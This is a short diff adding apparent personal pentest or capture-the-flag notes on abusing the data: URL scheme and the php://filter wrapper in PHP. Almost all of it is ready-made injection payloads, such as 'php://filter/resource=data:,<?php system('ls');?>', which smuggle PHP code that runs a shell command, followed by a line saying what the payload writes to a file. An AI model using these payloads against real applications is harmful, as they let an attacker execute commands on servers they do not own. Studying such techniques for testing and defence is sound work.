@@ -1,0 +1,9 @@
+RFC data URL scheme
+	data:[<mediatype>][;base64],<data>
+
+filters=resource=data:,<?php%20system('ls');?>
+
+
+php://filter/resource=data:,<?php%20system('ls');?>/resource=/usr/bin/php
+
+Generates `<?php system('ls'); ?>/resource=/usr/bin/php` to the file
